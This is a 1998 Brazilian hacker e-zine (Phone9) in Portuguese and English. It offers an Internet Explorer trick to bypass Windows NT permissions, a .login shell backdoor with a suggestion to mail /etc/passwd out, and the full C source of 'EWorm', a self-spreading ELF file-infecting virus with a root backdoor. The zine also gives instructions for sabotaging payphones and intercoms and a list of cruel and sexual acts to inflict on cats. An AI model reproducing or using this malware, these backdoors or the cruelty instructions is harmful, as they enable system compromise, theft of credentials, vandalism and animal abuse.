+
+    Hi, i'm a windows NT nerd, which makes me more nerd even :)
+
+	<A href="http://seuhost/seulogin/accesso.htm">acesso.htm</A>
+
+ E entao, o usuario salva o arquivo e logo depois pega o Internerd Exploder 
+ e vai na phone9.org, depois que a pagina estiver totalmente aberta,  entao
+ ele vai para o endereco: seuhost/seulogin/acesso.htm e quando a pagina co-
+ mecar a abrir,  voce aperta "back" ou "refresh" ou "stop", e  derepente  o
+ usrmgr.exe o programa que voce nao tinha acesso nenhum ira aparecer na sua
+ tela e voce tera acesso a este programa... O que acontece e' que quando vo
+ ce, aperta back ou stop ou refresh ou reload, entao o Ie procura pela pagi
+ na x:\winnt\system32\blank.htm e esta ao clicar no link ira executar o pro
+ grama, e catab0wm, byebye seguranca do C3 winnt :) Mude o nome do programa
+ no blank.html para executar outros...
+
+Obs: E' necessario ter um *.wav e um *.gif, pois estes irao confundir a ca-
+     beca (ou cerebro se tiver algum) do IE,  assim  a execucao forcada  do
+     programa sera obtida por voce.
+
+Rompendo permissoes em windows NT
+[blood@phone9.org]|[blood@puruca.com.br].
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³11 - .login backdoor							             ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄä¿ by bloodroot ³°°
+		  	  			   			    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+    Okay, entao em sistema linux (nao sei se funciona em sistemas unix.)
+    os arquivos .login,  tem prioridade  na leitura e execucao  uma  vez
+    que uma pessoa se logue no sistema... 
+    E' possivel  se instalar certos tipos de backdoors no sistema linux,
+    uma vez que um rotao se loga  no sistema,  dentro  do seu  diretorio
+    se existir tal aquivo .login, entao o conteudo executado dentro dele
+    pode ser um tanto arbitrario para o sistema, ou seu usuarios, poden-
+    do fazer com que varios tipos de backdoors sejam feitas no sistemas,
+    por aterrorizante ratoes por ai. 
+
+    Lembramos que  o poder de fogo desta  backdoor pode ser  devastador,
+    uma vez que este sistema de backdoor seja implantado na raiz do sis-
+    tema mais conhecida como '/'. Entao chega de tanta merda burocratica
+    e tentando fazer a backdoor parecer como um advisory sobre uma possi
+    vel falha, tentando imitar os unCERTs... :)
+
+    O arquivo .login deve ficar dentro do diretorio do cara que sera ata
+    cado, normalemente /root, ou entao /, lembrem-se disto :)
+
+ Bom, examine esta chamada:
+ /bin/cp /bin/sh /tmp/.login.shell
+
+    Agora, uma vez que este codigo seja colocado dentro do .login, entao
+    sera possivel copiar a shell do root ou do outros usuarios para den-
+    tro do arquivo e assim podendo ser executado por qualquer  vagabundo
+    do  sistema inteiro,  comprometendo toda a seguranca  imposta  pelos
+    merdz da cert.
+
+    Agora examine o codigo completo da backdoor para que voce possa  ver
+    como ela funciona:
+
+--[.login]--
+#!/bin/sh
+#smack this shit up!!!
+echo "Linux `uname -ar`"
+echo "No Mail"
+/bin/cp /bin/sh /tmp/.login.shell
+/bin/sh
+--[.login]--
+
+   Simples, hun? E' tao simples, mas mesmo assim para que o sistema rode
+   perfeitamente, e' necessario trocar algumas coisinhas:
+   [.inseguridade.]
+   - Va no arquivo /etc/login.defs e desabilite as opcoes de Verificar
+     em mail, e tambem a de expor a versao do sistema depois de logado. :)
+   - Certifiquisse de que todos os componentes necessarios para a execucao
+     dos comandos estejam existentes no sistema :)
+   [.seguridade.]
+   - Rode um ls que rode automaticamente em modo ls -a, vendo todo o conteu
+     do diretorio, inclusive os arquivo com . na frente.
+   - Depois retore a porra do programa, dug???
+
+  Agora, nos tambem ferificamos que o .login pode ser bem mais perigosa do  
+  que somente instalada dentro do diretorio de um misero usuario quando vc
+  pode ter shells de todos??? 
+
+  Bom, entao o nosso alvo simplesmente e': Colocar o .login com o  conteu-
+  do abaixo, no diretorio.... /,  que lugar mais simples do que onde  tudo 
+  comecou :)
+
+--[.login #para / :)]--
+#!/bin/sh
+echo "Linux `uname -ar`"
+echo "No Mail"
+
+whoami=`whoami`
+
+/bin/cp /bin/sh /tmp/.login.$whoami
+--[.login]--
+
+  Agora deixe-o rodando dentro do /, como .login que tudo ficara bem,  ou-
+  tra coisa importante a fazer e' destinar que todos os logins sejam ao in
+  vez de direcionados para os seus proprios diretorios home, que sejam di-
+  recionados para o diretorio / assim quando uma pessoa se logar ela auto-
+  maticamente ela estara levando um .login backdoor na bunda, esta  funcao
+  pode ser mudada no /etc/logins.defs.
+
+  O que estes tipos de backdoors representam o uso de ma fe de ferramentas
+  que de inicio foram feitas para permitir o bem estar de varios  usuarios
+  que acessam o sistema, sendo como uma ferramenta tambem de seguranca,  o
+  que nao limita o poder de uso desta ferramenta para a seguranca,ja que o
+  mesmo sentido de comandos que foram incluidos de forma insegura, e' pos-
+  sivel que voces possam acrescentar comandos como, mail blood@p9.org /etc/
+  passwd :) Bom, pensem no assunto qualquer discussao sobre qualquer assun
+  to do tipo, mail me: blood@phone9.org -- blood@puruca.com.br
+
+Obs. Nao e' purururururururururururururuca como muitos de voces acham que e'
+     o nome e' feio, mas o cara e' humilde, de-em uma chance ele, desde  que
+     ele pegou cancer ele tem tido acoes estranhas com a sua mao direita e o
+     seu olho, ooohhhhhhh... Da ate medo de pensar no que ele deve fazer com
+     aquilo a noite.
+
+bloodroot, acidflush productions
+(c) - P h o n e 9 Communications Systems, Inc.
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³12 - Eworn Project.			                                     ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by Dr.sm0g ³°°
+		  	  			   			      ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+                             _,----,  ,---,___
+      ,-------,______________\    _|__\    __/
+	\___     ____//   \\__   ___\__  ____|_   
+        /       \         \|   _____/  _____// "Making terrorism throught
+       /         \    \   _|   |  \_   |_      "source code... :)"
+       \____    _/\___/   \_   |_ _|   _//     - Dr.Sm0g & Taff membahs.
+	     `-----'    \___/____/ \____|
+		techno affliction [c]
+
+	t e c h n o  a f f l i c t i o n , inc.
+
+ EWorm Project                                                      28/09/98
+ Techno Affliction iNC.                                  www.psynet.net/taff
+ Copyright (c) 1998, by Dr.sm0g                               Made in Brazil. 
+ sm0g@psynet.net
+
+
+ .iNTRODUCAO
+
+ O EWorm eh um simples "virus" originalmente destinado -  mas nao  limitado 
+ - a infectar arquivos ELF. John V. (Antionline asshole) costuma dizer  que
+ atualmente, primeiro os duhdinhas invadem um sistema, alteram o site, para
+ soh entao, pensar numa justificativa socio-politica para tal irresponsabi-
+ lidade. Assim, digamos que o objetivo do EWorm seja o de realcar as neces-
+ sidades de uma  monitoracao constante do sistema, bem como o de suas respe
+ ctivas permissoes :)  Alem de apresentar ao leitor o funcionamento  basico
+ desse tipo de virus, iremos brevemente discutir os possiveis  efeitos  que 
+ um codigo bem escrito e disseminado poderia causar.   
+ Me esforcei ao maximo para evitar erros e equivocacoes (e tornar o texto o 
+ mais digestivel possivel), mas ainda considero isso longe do sufiente.
+ Caso voce tenha algo a acrescentar, discutir,  e principalmente  corrigir, 
+ nao hesite em me contactar.  Futuras atualizacoes desse projeto podem  ser 
+ vistas no site da TAff, www.psynet.net/taff .
+
+                                     ...
+
+ .Elf Worm
+
+ O EWorm usa como tecnica de infeccao um mecanismo que ja mostrou eficaz em 
+ diversos codigos, como  por exemplo o virus VLPI da SVTA  (que conseguiram 
+ complicar algo bem simples) o redirecionamento binario. Facil de implemen-
+ tar, o redbin pode ser considerado  quase que multi-operacional,   podendo 
+ ser utilizado em *qualquer* OS que suporte tal redirecionamento. Como essa 
+ tecnica foge do objetivo desse texto recomendo - sem querer  "puxar a lin-
+ guica" pro meu lado, mas o txt ajuda bastante -  que os interessados  deem 
+ uma rapida olhada em:  www.psynet.net/taff/files/b2.prj.
+ Como nem tudo eh perfeito,o redbin nao pode ser considerado 100% confiavel
+ Um dos poucos "probleminhas significativos" que merecem ser levantados, eh 
+ o fato de que *sob certas condicoes* o metodo pode ser notado em programas 
+ que utilizam o path para retornar algum erro em stdout como por exemplo no 
+ caso de /bin/ls. Ilustrando essa situacao, teriamos algo assim:
+      - O virus redireciona seus binarios limpos para /tmp,  e roda-os lah; 
+ No caso de um "ls" mal-sucedido, seria retornado o seguinte:
+
+ #ls d*
+ /tmp/ls: d* not found
+
+ Dos varios metodos testados para corrigir isso um dos poucos que apresenta
+ ram resultados significantes, usava certos acessos a memoria, que um usua-
+ rio comum nao seria habilitado a fazer, ainda mais no caso do programa ser 
+ remotamente acessado (exemplo: /bin/login). Testei outros mecanismos de in
+ feccao como por exemplo a de processos (feito tambem pela SVAT),  mas alem 
+ de imenso o codigo nao eh nenhum pouco multi-OS. Por hora, eu ainda consi-
+ dero o redbin algo bastante eficiente (..)
+ Tendo em mente que antes de mais nada um virus deve ser pequeno,  ao inves 
+ de elaborar todas as rotinas em C, e reinventar a roda (aumentando muito o 
+ tamanho do codigo), optei por "sujar" o virus  com alguns system(), que me
+ salvaram preciosos bytes.  O virus tem  um tamanho  relativamente  pequeno 
+ (que pode ser ainda menor, mas isso eh por conta do leitor),  se visto  os 
+ recursos utilizados. Nessa versao (publica) ocorre verificacao de arquivos 
+ (certifica-se que eh um ELF autentico, e ainda nao foi infectado); nao al-
+ tera  atime/mtime,  e nem as permissoes do arquivo;  encripta  as vitimas; 
+ "escaneia" diretorios (pre-definidos), e usa uma backdoor rudimentar,  que 
+ ajuda no processo de infeccao. Para ocupar ainda menos espaco, muitos tra-
+ tamentos a erro foram suprimidos, mas tenho certeza que nao teremos  maio-
+ res problemas :P 
+ Um virus simples poderia ter menos da metade do tamanho do EWorm, mas difi
+ cilmente se propagaria de forma eficiente,  ainda mais no caso de ambiente 
+ Unix.
+
+ A backdoor eh bem simples: a ideia inicial era de simplemente instalar uma 
+ SUID shell, mas ela nao transfere a UID 0 ao virus (pid) em  execucao.   A
+ saida foi instalar o codigo bruto   num arquivo (ja definido),   e roda-lo 
+ normalmente. O interessante em se fazer isso - existem tecnicas muito  me-
+ lhores, mas como criador, eu nao posso dar o braco a torcer hehehe -  esta 
+ na economia de espaco, e no fato do admin nao cair num prompt quando esti-
+ ver che cando aquele estranho arquivo SUID 0.
+      Cript() eh igualmente  simples. Nosso algoritmo acronicamente chamado
+ de 3Kfe (3 Key File Encription), usa 3 chaves  distintas: a primeira infor
+ ma o numero de bytes a encriptar, a outra diz quantas vezes serao rotacio-
+ nados, e a ultima diz  em que posicao o pointer vai iniciar a leitura  dos 
+ dados mandados a primeira variavel.
+ Problemas para os AV's, pois para desinfectar um arquivo eles terao de des
+ cobrir onde comeca e onde termina o "corrompimento do arquivo" ou entao se
+ dedicar a maravilhosas horas de brute-force,  que num  arquivo grande  vao 
+ dar um trabalho  e tanto (eu sei que eles podem seguir o virus,  mas deixe 
+ eu me iludir um pouquinho.. :).
+
+
+ .Riscos, blah blah.. e outras coisas mais..
+
+      A Internet Worm de R. Morris, era um complexo conjunto de arquivos cu
+ jo unico objetivo era o de se copiar para o maior numero possivel de siste
+ mas. Apesar de nao ser multi-OS (rodava em Sun Microsystems Sun-3 worksta-
+ tions e   VAX computers  com uma variante da versao  4 do  Berkeley Unix), 
+ a worm se expandiu de forma chocante.
+      Me parece que o numero de exploits  existentes e disponiveis  em 1988
+ era ligeiramente menor que os de hoje... Os sistemas abertos e administra-
+ dos por pessoas incompetentes, hoje sao maiores, e a grande Rede  cresce a 
+ cada dia, aumentando ainda mais o numero de vitimas potencias.
+ Eu fiz aqui uma  variante do Eworm chamada de Brasilix, que alem de um nas
+ ty code, tem algumas rotinas  e modificacoes a mais,   como   por  exemplo 
+ sniffing. O Brasilix se mostrou *muito* infeccioso, e seu tamanho nao exce
+ deu muito as espectativas. Eh recomendavel o uso de shells mais seguras 
+ (ex. SSH), ou num futuro proximo, a tendencia eh que os desastres aumentem
+
+
+
+ .Install - caso alguem queira testar Eworm para propostitos educacionais :)
+
+ Recomendo executar esse procedimentos via UID!=0, pois nao acho saudavel 
+ rodar isso como root. Inicialmente, crie um diretorio e copie para ele o 
+ eworm.c e algum arquivo binario que voce deseje infectar. Compile e rode
+ o eworm normalmente.  
+        O codigo encontra-se ao final do documento.
+
+
+ .FAQ
+
+ Abaixo vao respostas para alguns mails que recebemos de beta-testers, viti-
+ mas e outras pessoas que tiveram acesso ao programa.
+
+ 1) Eu compilei o eworm (gcc -o eworm eworm.c) e infectei um arquivo binario
+ mas roda-lo, o proprio eworm foi infectado! O mais estranho e que ao tentar
+ rodar o virus novamente (apos ser infectado) ele travou. Porque?
+ R: Entenda que o virus eh  um arquivo  normal,  e apesar de conter o codigo
+ bruto em si, ele ainda nao possui a  marcacao de infectado ('EW') e por is-
+ so eh normalmente contaminado. O fato dele travar, eh porque por operar por
+ loop's (while's, etc), quando voce roda um virus dentro  de outro, ele meio
+ que se perde, e "trava" (na realidade ele nao trava, apenas fica loopando).
+
+ 2) O EWorm possui alguma fraqueza ou bug mais grave?
+ R: Como todo programa que se preze, o EWorm tambem tem bugs! Alguns sao
+ faceis de se corrigir, deixados no codigo publico apenas para "facilitar" a
+ vida dos duhdinhas que vao rodar o virus sem ao menos entender o que ocorre
+ Abaixo vai uma relacao do que (segundo  minha opiniao) deve ser corrigido, 
+ e como "fixar" o problema.. Note que nenhum desses probleminhas pode compro
+ meter o funcionamento do virus! Ele apenas nao ira rodar tao bem..
+ 
+ - Se o parent process durar mais do que o child, ele ainda estaram 
+ "lockado" quando o child executar um remove! Isso eh muito importante de se
+ corrigir, para evitar rastros. Eh uma simples questao de se redirecionar o 
+ signal para um remove() :)
+
+ 3) Quando o Brasilix, ou uma versao plena do EWorm sera liberada?
+ R: Nos nao temos planos de fazer isso. A nossa versao privada do EWorm jah
+ foi suficientemente modificada para evitar av's que se baseiem no codigo 
+ publico. Divulgar o nosso trabalho ira apenas prejudicar o bichano :)
+
+ 4) A tecnica de backdoor pode ser mudada?
+ R: A grande vantagem do EWorm, eh que apesar de um codigo que a primeira
+ vista parece "meio confuso", altera-lo eh algo muito simples. Qualquer roti
+ na pode ser alterada. Note porem, que estamos falando de um virus, e nao eh
+ bom abusar do tamanho.
+
+ 5) O EWorm roda em que sistemas operacionais?
+ R: Aparentemente ele funciona bem em sistemas Linux (objetivo primario), e
+ compativeis. Ouvi dizer que ele tambem eh bastante estavel em SunOS,Digital
+ e System V. Caso alguem tenha algo a acrescentar ou retirar, reply..
+
+ 7) O virus foi disseminado?
+ R: Sim e nao. O codigo pode ser facilmente alterado, podendo estar sendo
+ distribuido por alguem, nesse exato momento. Alem disso, estou com um estra
+ nho pressentimento a respeito dos hosts gov.br/mil.br.  Melhor esse pessoal
+ tomar cuidado.. talvez, muito cuidado sera o ideal.
+
+ 8) Porque voces divulgaram apenas o codigo publico (que esta bugado)? Vai
+ ver voces nao conseguiram terminar o virus, e estao esperando que alguem fa
+ ca o trabalho sujo por voces..
+ R: Essa perguntinha nos recebemos de um certo administrador...  A razao  eh
+ bem simples: nos somos egoistas e nao queremos perder horas de trabalho,des
+ perdicada na mao de lamers irresponsaveis, ou de AV's.  Se voce  duvida  da
+ nossa capacidade, foda-se. Nos nao temos que lhe provar nada, o codigo fala
+ por si proprio.
+
+ 9) Porque usar "#define vTAM", se o tamanho do virus pode mudar dependendo
+ do compilador utilizado na compilacao de eworm.c? O codigo nao fica tao por
+ tavel, fica?
+ R: dumped da Uground disse que o ideal seria utilizar um fseek  e ftell ao
+ inves de apelar para um define, tornado assim o codigo mais profissional e
+ portavel. Acontece, que uma rotina dessa alem de aumentar o numero de aces-
+ so ao disco (sim, o acesso eh insignificante, mas ainda existe) aumentaria
+ o codigo em alguns bons bytes. Eu ainda prefiro compilar, ver o size, mudar
+ no #define e recompilar, do que apelar pra isso... estamos fazendo um virus
+ ele nao precisa ser portavel. O codigo teria de ser +- assim (fiz de cabeca
+ isso eh apenas pra voce ter uma ideia) :)
+
+ FILE *fp;
+ int vTAM;
+ fp=fopen(argv[0],"r");
+ fseek(fp,0,SEEK_END);
+ vTAM=ftell(fp);
+ 
+ Acho que isso deve resolver para os mais "profissionais"  =)
+ ----------------------------------------------------
+/*
+   Elf Worm Project
+   Copyright (c) 1998, Dr.sm0g [TAff]
+   Techno Affliction iNC. Made in Brasil.
+   sm0g@psynet.net / taff@psynet.net
+
+  "Aos que sabem, nada precisa ser dito.
+   Aos que nao sabem, menos ainda, pois nunca
+   estao disposto a escutar."
+
+   TAff Labs: Internet Terrorism trought source code >:]
+
+
+   eworm.c
+*/
+
+#include <fcntl.h>
+#include <utime.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+
+#define vTAM 28525                        /* gcc -O eworm.c size */
+
+FILE *fp;
+DIR *dirp;
+long int icnt, bd, i;
+char Elf[5]={0x7f,0x45,0x4c,0x46,'\0'},          /* ELF file ID         */
+     Ebuf[5]={'\0'}, ID[3]={0x45,0x57,'\0'},     /* ID[3]=EWorm ID mark */
+     Path[50], Buff[100], Ntm[30],Nom[30]="/tmp/";
+
+struct dirent *dirf;
+struct stat info,*ip;
+struct utimbuf dtime;
+
+
+main(int argc, char *argv[], char *envp[])
+{
+  getcwd(Path, 30);
+  strcat(Nom, argv[0]);                           /* /tmp/argv[0](clean) */
+  strcat( strcat(Path,"/"), argv[0]);             /* path de argv[0]     */
+  stat(argv[0], ip = &info);                      /* nosso status        */
+
+  /* verifica se estamos rodando na forma de backdoor                    */
+  if( (getuid() == 0) && (ip->st_size == vTAM) ) bd=1;
+
+  /* faz o fork, desencripta argv[0] e manda-o limpinho p/ /tmp, onde eh */
+  /* rodado pelo processo pai.                                           */
+  if( (bd == 0) && (ip->st_size != vTAM) && (fork()) ) {
+    sprintf(Buff, "tail -c%ld %s>%s", (ip->st_size)-vTAM, argv[0], Nom);
+    Cript(argv[0], 2);
+    PrnMod(Nom);
+    execve(Nom,argv,envp);
+  }
+
+  else {
+    /* somos root -> criamos uma backdoor para as futuras geracoes :)    */
+    if( (getuid() == 0) && (ip->st_size != vTAM) ) {
+      sprintf(Buff,"head -c%ld %s>/tmp/backd", (ip->st_size)-vTAM, argv[0]);
+      system(Buff);
+    }
+
+    /* nao somos root -> verificamos a presenca de uma backdoor ja feita..*/
+    if( (getuid() != 0) && ( access("/bin/backd", F_OK) ) == 0) {
+      system("/bin/backd");
+      exit(0);
+    }
+
+    /* para nossa leitua de brute-force..                                */
+    dirp = opendir(".");
+    do
+    {
+      /* caso chegue ao fim do diretorio, sem ter infectado ao menos 2 ar */
+      /* quivos, chdir() de acordo com a uid do usuario que esta rodando. */
+      if( ((dirf=readdir(dirp)) == NULL) && (icnt !=2 )) {
+        if( chdir(bd==1 ?"/bin" : getenv("HOME") ) == 0) {
+          icnt++; dirp = opendir(".");
+          dirf = readdir(dirp);
+        }
+        else break;
+      }
+
+      /* se tiver u+rwx no arquivo (o root tem ugo+rwx), continue        */
+      if( access(dirf->d_name, R_OK| W_OK| X_OK) == 0)
+      {
+        /* pega status do arquivo e verifica se ele nao eh um FIFO maluco.*/
+        stat(dirf->d_name, &info);
+        if( ( (info.st_mode&S_IFMT) == S_IFREG) )
+        {
+          /* abre e verifica se eh um arquivo ELF autentico..            */
+          fp = fopen(dirf->d_name, "r+");
+          fread(Ebuf, 4 ,1, fp);
+          if( strcmp(Ebuf, Elf) == 0)
+          {
+            /* verifica se ja esta contaminado..                         */
+            bzero(Ebuf, 4);
+            fseek(fp, -2, SEEK_END);
+            fread(Ebuf, 2, 1, fp);
+            if( strcmp(Ebuf, ID) !=0 )            /* Ho! Hora do rango!  */
+            {
+              fseek(fp, 0, SEEK_END);             /* vai pro fim do arq  */
+              fwrite(ID, 2, 1, fp);               /* e coloca nossa ID.. */
+              fclose(fp);
+
+              /* o enviamos para /tmp, encriptamos e setamos o virus nele*/
+              strcat( strcat(Ntm, "/tmp/"), dirf->d_name);
+              sprintf(Buff,"head -c%i %s>%s;cat %s>>%s",\
+              vTAM, Path, Ntm, dirf->d_name, Ntm);
+              Cript(dirf->d_name, 1);
+
+              /* substituimos o original pelo /tmp/vitima (infectado).. */
+              sprintf(Buff, "cp %s .;rm %s", Ntm, Ntm); system(Buff);
+
+              dtime.actime=info.st_atime;           /* restauramos atime */
+              dtime.modtime=info.st_mtime;          /* restauramos mtime */
+              utime(dirf->d_name, &dtime);          /* seta-os..         */
+              PrnMod(dirf->d_name);                 /* restaura perm/own */
+              bzero(Ntm, 30); icnt++;
+            }  /* if ID     */
+          }  /* if ELF     */
+        }  /* if(access.. */
+      }  /* if(stat)     */
+    } while( (dirf != NULL) && (icnt <= 2));
+  }  /* fork()         */
+
+  /* nosso remove() bugado (ver documentacao), remove o tmp de argv[0].*/
+  remove(Nom);
+}  /* main()          */
+
+
+/* --- funcoes adicionais --------------------------------------- */
+
+PrnMod(char *arq)  /* talvez isso seja desnecessario, mas eh safe code. :)*/
+{
+  i = chmod(arq, info.st_mode);                    /* restaura permissoes */
+  i = chown(arq, info.st_uid, info.st_gid);        /* restaura owners     */
+}
+
+Cript(char *arq, int opt)
+{
+  /* KEY=chave da encriptacao, NUM=numero de bytes a encriptar */
+  long int len = strlen(arq), KEY = (len+2)*3, NUM = (len*7)-5, Ep[NUM];
+
+  /* chave1: vTAM+strlen(arq)*8=numero de bytes a deslocar o ponteiro */
+  fp = fopen(arq,"r+");
+  fseek(fp, vTAM+strlen(arq)*8, SEEK_SET);
+
+  for(i = 0; i<NUM; i++) {
+    Ep[i] = fgetc(fp);
+    fseek(fp, -1, SEEK_CUR);
+    fprintf(fp, "%c", (opt == 1 ? ++Ep[i]*KEY : --Ep[i]*KEY) );
+   }
+  fclose(fp);
+  system(Buff);
+}
+
+
+-EOF
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³13 - /lost+found, the P9 garbage can                                   ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by various ³°°
+		  	  			   			      ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+ [ Editorial do lixao ] ---------------------------------------------------
+
+
+  elektrochok.  Welcome to the 31337 part of our zine,  where any one dump
+  their stupid and uncompreensive bullshit in here, and then wait for some
+  guy stupid enought to do something with it grab it  :) But who  knowz???
+  Since somebody goes into the middle of a forest to take pictures with so
+  me ugly dude, i believe that every piece a shit in the world is vulnera-
+  ble, as soon as being a dumbass is a lot easier then being a rich micro-
+  shit owner.
+
+					Wanna knowz what tha fuck was writen in it??
+					C'mon?? Learn english to really dominate the
+                              World, isn't it the Pinkye!!!??? :)
+
+  - kleptomaniak 
+
+ [ anarxisty ] ------------------------------------------------------------ 
+									     - kleptomaniak &
+											bloodroot
+
+ Anarxisty??? klpetomaniak e bloodroot ensinam as tecnicas mais estupidas e
+ explosivas dos filmes da secao da tarde da poderosa :) McGayver perde, ele
+ diz para todos esta frase: "Com as aulas anarxistas da Phone9 eu consegui
+ construir um mulher com um pedaco de madeira e um pouco de argila que caiu
+ do bolso do utlimo cara que eu matei la nos Emirados Arabes" - McGayver.
+
+ Entao sente e relaxe  enquanto seus filhos explodem a sua casa com as  li-
+ coes anarxistas da Phone9... :)
+ 
+
+
+   - Destruindo telefones com 109 (somente no rio de janeiro)
+   by bloodroot.
+
+ Bom, depois de umas cartas promissorias enviadas pela telerda, nos ficamos 
+ um tanto perdidos, entao nos vamos liberar alguns truques para voce testar
+ em telefone publicos da telerj... :)
+
+ 109, e' um sistema de loopback o numero habilitado no rio de janeiro intei
+ ro, faz com que um proprio telefone ligue para o mesmo numero, sem dar ocu
+ pado, este codigo e usado por tecnicos da telerj para testar se o telefone
+ esta realmente funcionando. 
+ Comumente voce acha no rio telefones do qual o gancho telefonico sao deste
+ tipo:
+
+   
+       __        __
+      /     __	 \
+      |    (__) -- | ----> Botao de desligar o telefone... :)
+	\__        __/
+
+
+ Bom, o plano e' o seguinte, primeiro voce tira o telefone do gancho e digi
+ ta o codigo 109, depois de apertado o numero, bata com o speaker do telefo
+ ne o mais forte possivel fazendo com que o botao de desligar fique  preso,
+ assim o 109 fica tocando mesmo depois que uma pessoa tirar  o telefone  do
+ gancho, em alguns lugares o numero de toques padrao sao de 36 toques,  mas
+ em outros telefones, podem ser 50 ou ate mesmo 100, boa sorte :)
+
+
+  - Fudendo com interfones
+  by bloodroot
+
+ Bom, em alguns interfones de marcas estupidas (cujo nomes nao vem ao caso)
+ eles fazem uma contrucao eletrica e estetica tao mal feita que um  simples
+ crianca pode puxar  um fio do interfone e tomar um choque.  Entao  lutando
+ por estas "extraordinarias" criancas, a Phone9 ensina como fuder este tipo
+ de interfones :)
+
+ Dedicado para: Thiago, Peitao.
+
+ 1. Primeiro com um faca, passe-a por entre a extremidade inferior do inter
+ fone a faca, quando ela chegar ao outro lado, ela devera carregar com  ela
+ alguns fios da cor laranja ou preto.
+ 
+ 2. Uma vez que o fio estiver para fora,  pegue aquele  alicate esperto que
+ voce guarda para quando a sua mulher quiser ver "Maria Hiena", e corte es-
+ tes fios, e nunca mais (ate a companhia sercomtel chegar), ninguem ira fa-
+ lar no telefone ou criancas serao "chocadas" com os interfones :)
+
+
+   - Nasty stuff's to do with kats
+   by kleptomaniak
+
+ Well, this is my first writing for P9,  and today i'm going to  teach you
+ dumbasses, how to fuck up a cat, and get a ride of it :) So joing the fun
+ kye horse, and lets begin tha fun.
+
+ Okay, so, you're walking on the street  and then you've a nice and  little
+ puffy catty, so then your girlfriend come around to play with it  and  you
+ as soon as you can, read this shit. 
+
+ Top 20 stuff's to do with a cat if you can get one:
+ 10. Pegue um pedaco de barbante e prenda uma bolinha em uma das pontas, de
+     pois pegue uma ponta e amarre-o no rabo do gatinho, agora jogue a pon-
+     ta com a bolinha para o gato e veja ele ficar mais tonto que barata em
+     concerto de sapateado :)
+  9. Essa e' malvada, pegue uma gatinha no cio e coloque perto de um macho,
+     mais ou menos em uns 5 minutos o macho estara de peru para fora  espe-
+     para cravar na bichinha, entao voce pega o gelol e PSSSIIIII bem na ca
+     beca do pintu dele, e veja o gato correr de um lado para o outro  sen-
+     tindo muito dor... O mesmo pode ser feito com pasta dente.
+  8. Quando a gatinha estiver no cio, pegue uma caneta bem grossa  e  enfie 
+     na bunda da gatinha e espere ate ouvir gemidos.
+  7. Arranque os bigodes do gato,  e  coloque-o para andar  em algum  lugar 
+     que seja necessario muito equilibrio e veja-o cair no chao sem  nenhum
+     senso de direcao :)
+  6. Gatos adoram presunto, entao de a eles presunto, mas coloque dentro do
+     presunto fatias bem pequenas de prozak e veja o gato ficar hiperativo,
+     esta e' hilariante.
+  5. Tente ensinar o gato a transar, mostrando a ele um ato de sexo ao vivo
+     por exemplo o do seu pai e sua mae.
+  4. Influencia corneadas familiares e surubas,  por exemplo pegue o  filho
+     coloque-o para fuder com a mae.
+  3. Coloque o gato para fazer xixi em um formigueiro,  quando ele  cavar o
+     buraco o exercito do formigueiro inteiro ira subir no cu do gatinho  e
+     entao miau, miau para voces :)
+  2. Vire o gato de cabeca para baixo e pendure-o em algum lugar,  ate  que
+     todo o sangue va para a cabeca, entao o gato comeca a chorar... 
+  1. Quando ele estiver comendo pegue a cabeca dele e prenda no pote de co-
+     mida, o gato ira vomitar ate nao poder mais.
+
+        Estas foram as dicas nasty para se fazer com gatos por kleptomaniak,
+				proxima edicao tem mais sobre sapos e passarinhos :)
+
+ [ telnet loop ] ---------------------------------------------------------- 
+										   by bi0h4zard
+
+  Esta e' antiga, mais ainda existem pessoas que nao sabem como se proteger
+  e nem como executar o bug do telnet na porta 19 (chargen),  esta  e'  bem
+  simples de se fazer e de se proteger...
+	
+	executando a bug:
+	p9~:/root> telnet 127.0.0.1 19
+	
+	e entao um bando de caracteres loucos estarao aparecendo na tela
+	do seu linux ou unix.
+
+	Protefendo-se do bug:
+	Bom, apenas abrir outra secao em outro terminal e depois apenas de um
+	kill no processo:
+	p9~:/r007> ps
+	00  tty01   telnet 127.0.0.1 19
+	
+	p9~:/r007> kill 00
+	
+	E pronto, tudo se resolve rapidinho.
+ [ Modem Denial Of a Service ] -------------------------------------------- 
+ 										     by SEkr4t7
+
+ Esta devolta um antigo bug na entranhas do modem, que permite que voce de
+ um crash no modem. E o mais interessante do bug e' que depois de mais  de
+ aproximadamente 10 anos, em que o bug existe, nada foi feito para impedir
+ que o DoS seja feito.
+
+ Para executar o bug:
+ sek~:/> telnet 127.0.0.1 21
+ Trying 127.0.0.1...
+ Connected to 127.0.0.1
+ Escape Charactere is '^]'.
+ 220 FTP SEkt0r37 - (fuck.org)
